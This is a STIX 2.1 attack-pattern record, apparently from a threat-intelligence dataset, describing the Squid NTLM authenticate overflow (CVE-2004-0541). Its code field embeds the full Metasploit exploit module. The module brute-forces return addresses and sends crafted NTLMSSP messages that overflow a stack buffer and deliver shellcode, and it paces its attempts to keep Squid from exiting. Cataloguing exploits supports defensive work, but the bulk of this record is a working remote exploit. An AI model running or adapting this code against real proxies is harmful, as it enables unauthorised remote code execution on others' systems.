{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b5206af9-90fb-42f3-9be3-d047e28678d6",
    "created": "2024-08-14T17:04:49.097101Z",
    "modified": "2024-08-14T17:04:49.097105Z",
    "name": "Squid NTLM Authenticate Overflow",
    "description": " This is an exploit for Squid\\'s NTLM authenticate overflow (libntlmssp.c). Due to improper bounds checking in ntlm_check_auth, it is possible to overflow the 'pass' variable on the stack with user controlled data of a user defined length.  Props to iDEFENSE for the advisory. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/proxy/squid_ntlm_authenticate.rb",
            "external_id": "squid_ntlm_authenticate.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0541"
        },
        {
            "source_name": "reference",
            "url": "http://www.idefense.com/application/poi/display?id=107"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Brute\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Squid NTLM Authenticate Overflow',\n      'Description'    => %q{\n          This is an exploit for Squid\\'s NTLM authenticate overflow\n        (libntlmssp.c). Due to improper bounds checking in\n        ntlm_check_auth, it is possible to overflow the 'pass'\n        variable on the stack with user controlled data of a user\n        defined length.  Props to iDEFENSE for the advisory.\n      },\n      'Author'         => 'skape',\n      'References'     =>\n        [\n          [ 'CVE', '2004-0541'],\n          [ 'OSVDB', '6791'],\n          [ 'URL', 'http://www.idefense.com/application/poi/display?id=107'],\n          [ 'BID', '10500'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'Space'    => 256,\n          'MinNops'  => 16,\n          'Prepend'  => \"\\x31\\xc9\\xf7\\xe1\\x8d\\x58\\x0e\\xb0\\x30\\x41\\xcd\\x80\",\n          'PrependEncoder' => \"\\x83\\xec\\x7f\",\n\n        },\n      'Platform'   => %w{ linux },\n      'Targets'        =>\n        [\n          [ 'Linux Bruteforce',\n            {\n              'Platform'   => 'linux',\n              'Bruteforce' =>\n                {\n                  'Start' => { 'Ret' => 0xbfffcfbc, 'Valid' => 0xbfffcf9c },\n                  'Stop'  => { 'Ret' => 0xbffffffc, 'Valid' => 0xbffffffc },\n                  'Step'  => 0\n                }\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-06-08',\n      'DefaultTarget'  => 0))\n\n    register_advanced_options(\n      [\n        # We must wait 15 seconds between each attempt so as to prevent\n        # squid from exiting completely after 5 crashes.\n        OptInt.new('BruteWait', [ false, \"Delay between brute force attempts\", 15 ]),\n      ])\n  end\n\n  def brute_exploit(addresses)\n    site = \"http://\" + rand_text_alpha(rand(128)) + \".com\"\n\n    print_status(\"Trying 0x#{\"%.8x\" % addresses['Ret']}...\")\n    connect\n\n    trasnmit_negotiate(site)\n    transmit_authenticate(site, addresses)\n\n    handler\n    disconnect\n  end\n\n  def trasnmit_negotiate(site)\n    negotiate  =\n      \"NTLMSSP\\x00\"        + # NTLMSSP identifier\n      \"\\x01\\x00\\x00\\x00\"   + # NTLMSSP_NEGOTIATE\n      \"\\x07\\x00\\xb2\\x07\"   + # flags\n      \"\\x01\\x00\\x09\\x00\"   + # workgroup len/max       (1)\n      \"\\x01\\x00\\x00\\x00\"   + # workgroup offset        (1)\n      \"\\x01\\x00\\x03\\x00\"   + # workstation len/max     (1)\n      \"\\x01\\x00\\x00\\x00\"     # workstation offset      (1)\n\n    print_status(\"Sending NTLMSSP_NEGOTIATE (#{negotiate.length} bytes)\")\n    req =\n      \"GET #{site} HTTP/1.1\\r\\n\" +\n      \"Proxy-Connection: Keep-Alive\\r\\n\" +\n      \"Proxy-Authorization: NTLM #{Rex::Text.encode_base64(negotiate)}\\r\\n\" +\n      \"\\r\\n\"\n    sock.put(req)\n\n  end\n\n  def transmit_authenticate(site, addresses)\n    overflow     =\n      rand_text_alphanumeric(0x20) +\n      [addresses['Ret']].pack('V') +\n      [addresses['Valid']].pack('V') +\n      \"\\xff\\x00\\x00\\x00\"\n    shellcode    = payload.encoded\n    pass_len     = [overflow.length + shellcode.length].pack('v')\n    authenticate =\n      \"NTLMSSP\\x00\"        + # NTLMSSP identifier\n      \"\\x03\\x00\\x00\\x00\"   + # NTLMSSP_AUTHENTICATE\n      pass_len + pass_len  + # lanman response len/max\n      \"\\x38\\x00\\x00\\x00\"   + # lanman response offset  (56)\n      \"\\x01\\x00\\x01\\x00\"   + # nt response len/max     (1)\n      \"\\x01\\x00\\x00\\x00\"   + # nt response offset      (1)\n      \"\\x01\\x00\\x01\\x00\"   + # domain name len/max     (1)\n      \"\\x01\\x00\\x00\\x00\"   + # domain name offset      (1)\n      \"\\x01\\x00\\x01\\x00\"   + # user name               (1)\n      \"\\x01\\x00\\x00\\x00\"   + # user name offset        (1)\n      \"\\x00\\x00\\x00\\x00\"   + # session key\n      \"\\x8b\\x00\\x00\\x00\"   + # session key\n      \"\\x06\\x82\\x00\\x02\"   + # flags\n      overflow + shellcode\n\n    print_status(\"Sending NTLMSSP_AUTHENTICATE (#{authenticate.length} bytes)\")\n    req =\n      \"GET #{site} HTTP/1.1\\r\\n\" +\n      \"Proxy-Connection: Keep-Alive\\r\\n\" +\n      \"Proxy-Authorization: NTLM #{Rex::Text.encode_base64(authenticate)}\\r\\n\" +\n      \"\\r\\n\"\n    sock.put(req)\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-06-08",
    "x_mitre_platforms": [
        "linux'"
    ]
}